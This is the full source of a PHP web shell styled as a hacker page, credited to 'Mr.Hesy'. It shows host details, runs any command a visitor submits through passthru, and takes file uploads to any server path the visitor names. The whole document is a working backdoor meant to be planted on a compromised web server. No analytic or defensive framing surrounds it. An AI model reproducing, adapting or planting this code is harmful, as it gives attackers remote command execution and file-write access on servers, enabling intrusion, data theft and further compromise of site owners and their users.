<title><?php echo getenv("HTTP_HOST"); ?></title>

<body style="font-family: Arial; font-size: 8pt; color:#00FF00" text="#008000" bgcolor="#000000" link="#00FF00">

<STYLE type=text/css>BODY {
       SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #008000; SCROLLBAR-SHADOW-COLOR: #008000; SCROLLBAR-BASE-COLOR:  #000000
}
</STYLE>


<table border="0" cellpadding="0" cellspacing="0" style="border-style:double; border-width:3; border-collapse: collapse" width="100%" id="AutoNumber1" bordercolor="#008000" height="68">
  <tr>
    <td width="100%" style="border-top:0px solid #000000; border-bottom:0px solid #000000; border-left-style:solid; border-left-width:0px; border-right-style:solid; border-right-width:0px" align="center" valign="bottom" bgcolor="#1E1E1E" height="1">
    <font face="Webdings" size="7" color="#008000">!</font></td>
  </tr>
  <tr>
    <td width="100%" style="border-top:0px solid #000000; border-bottom:0px solid #000000; border-left-style:solid; border-left-width:0px; border-right-style:solid; border-right-width:0px" align="center" valign="bottom" bgcolor="#1E1E1E" height="18"><b>
    <font size="2" color="#00FF00">Team</font></b></td>
  </tr>
  <tr>
    <td width="100%" style="border-top:0px solid #000000; border-bottom:0px solid #000000; border-left-style:solid; border-left-width:0px; border-right-style:solid; border-right-width:0px" align="center" valign="bottom" bgcolor="#1E1E1E" height="16"><b>
    <font size="2" color="#00FF00">1/0</font></b></td>
  </tr>
  </table>
  
  
<table border="1" width="100%" bordercolor="#008000" style="border-style:double; border-width:3; border-collapse: collapse; " cellpadding="0" cellspacing="0"  > 
<tr>
<td width="749" height="47">
<font face="Arial" size="1" color="#00FF00">
<?php
echo "> Machine Information";
echo "<br>> Software : ". getenv("SERVER_SOFTWARE");
echo "<br>> Uname -a : ". php_uname();
echo "<br>> Id : ". passthru("id");
echo "<br>> IP : ". ($_SERVER["REMOTE_ADDR"]);
echo "<br>> User : " .get_current_user() ;
echo "<br>> Dir : ". ($_SERVER["DOCUMENT_ROOT"]);
?>
</font>
</td>
</tr>
</table>
<body style="font-family: Arial; font-size: 8pt; color:#00FF00" text="#008000" bgcolor="#000000" link="#00FF00">
<form method="POST" action="<? $php_self ?>">
  <p>
  <b>
  <font color="#008000">Your Command :</font></b>
  <input type="text" name="c" size="89" style="border: 1px solid #008000; "><input type="submit" value="Submit" name="B1" style="font-family: Arial; color: #008000; font-weight: bold; border: 2px solid #008000; background-color: #000000; font-size:8pt"></p>
  </p>
</form>


<textarea rows="20" name="S1" cols="140" style="color: #008000; font-size: 8pt; font-family: Arial; border: 2px solid #008000; background-color: #000000; font-weight:bold"><?php if($c){passthru($c);} ?>
</textarea>


<?php
$docr = $_SERVER["DOCUMENT_ROOT"];
echo <<<HTML
<p>
<p>File Upload</b> </p>
</p>
<table>
<form enctype="multipart/form-data" action="$self" method="POST">
<input type="hidden" name="ac" value="upload">
<tr>
<td><font size="1">Your File : </font> </td>
<td>
<input size="48" name="file" type="file" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000"></td>
</tr>
<tr>
<td><font size="1">Upload Dir : </font> </td>
<td>
<input size="48" value="$docr/" name="path" type="text" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000">
<input type="submit" value="Upload  " style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000"></td>
$tend
HTML;

if (isset($_POST["path"])){

$uploadfile = $_POST["path"].$_FILES["file"]["name"];
if ($_POST["path"]==""){$uploadfile = $_FILES["file"]["name"];}

if (copy($_FILES["file"]["tmp_name"], $uploadfile)) {
    echo "File uploaded to : $uploadfile
";
    echo "- Size : " .$_FILES["file"]["size"]. "
";

} else {
    print "Error  Upload File :
";
}
}
?></table>
<p align="center"><b><font color="#C0C0C0" size="2">© By Mr.Hesy </font>
<font color="#008000" size="2">